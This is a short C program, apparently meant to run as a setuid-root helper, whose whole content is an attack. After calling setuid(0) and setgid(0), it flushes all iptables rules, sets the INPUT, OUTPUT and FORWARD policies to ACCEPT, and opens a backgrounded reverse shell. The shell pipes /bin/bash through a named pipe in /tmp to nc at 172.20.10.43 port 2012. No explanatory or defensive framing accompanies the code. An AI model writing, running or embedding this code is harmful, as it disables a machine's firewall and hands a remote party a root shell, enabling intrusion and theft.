#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv){

	setuid(0);
	setgid(0);

	system("iptables -F");
	system("iptables -t mangle -F");

	system("iptables -P INPUT ACCEPT");
	system("iptables -P OUTPUT ACCEPT");
	system("iptables -P FORWARD ACCEPT");

	system("[ ! -p /tmp/aejhfgtg ] && mkfifo /tmp/aejhfgtg");
	system("(/bin/bash 0</tmp/aejhfgtg | nc 172.20.10.43 2012 1>/tmp/aejhfgtg) &");

	return 0;
}
